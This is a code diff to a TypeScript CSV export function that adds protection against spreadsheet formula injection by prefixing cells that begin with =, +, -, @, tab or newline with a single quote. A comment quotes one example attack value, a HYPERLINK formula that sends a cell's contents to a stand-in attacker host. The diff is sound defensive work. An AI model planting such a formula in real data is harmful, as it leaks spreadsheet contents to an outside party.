@@ -29,11 +29,32 @@ export interface CsvColumn<T> {
   value: (row: T) => CsvCell;
 }
 
-/** Serialize one cell per RFC 4180: only quote when needed, escape "
- *  by doubling. null/undefined become empty strings. */
+/**
+ * Characters that Excel / Google Sheets / Numbers interpret as the
+ * start of a formula when they appear at the beginning of a cell.
+ * If a user puts `=HYPERLINK("http://evil.com?c="&A1,"click")` in a
+ * vendor name and a CPA opens our exported CSV in Excel, the formula
+ * fires. The standard defense (OWASP's CSV-injection guidance) is to
+ * prefix the cell with a single quote — Excel treats it as a literal,
+ * not a formula, and the leading quote stays out of the visible value
+ * in most clients.
+ *
+ * We also block leading tab / CR / LF because some clients trim them
+ * silently and then evaluate what's left.
+ */
+const FORMULA_TRIGGERS = /^[=+\-@\t\r\n]/;
+
+/** Serialize one cell per RFC 4180 with CSV-injection protection.
+ *  null/undefined become empty strings. */
 function escapeCell(input: CsvCell): string {
   if (input === null || input === undefined) return '';
-  const s = typeof input === 'string' ? input : String(input);
+  let s = typeof input === 'string' ? input : String(input);
+  // Defang formulas before quoting — the leading single quote becomes
+  // part of the cell content, so it has to be inside the quotes if the
+  // value needs quoting at all.
+  if (FORMULA_TRIGGERS.test(s)) {
+    s = `'${s}`;
+  }
   // Quote if it contains a comma, quote, or newline.
   if (/[",\r\n]/.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
